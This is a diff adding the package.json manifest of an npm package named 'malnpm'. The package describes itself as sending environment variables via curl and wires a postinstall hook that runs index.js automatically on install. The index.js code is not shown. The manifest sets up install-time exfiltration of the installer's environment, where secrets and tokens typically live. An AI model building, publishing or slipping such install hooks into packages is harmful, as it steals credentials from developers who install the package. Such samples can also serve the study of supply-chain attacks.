@@ -1,0 +1,12 @@
+{
+  "name": "malnpm",
+  "version": "1.0.0",
+  "description": "A project to send environment variables via curl",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node index.js"
+  },
+  "author": "",
+  "license": "ISC",
+  "dependencies": {}
+}
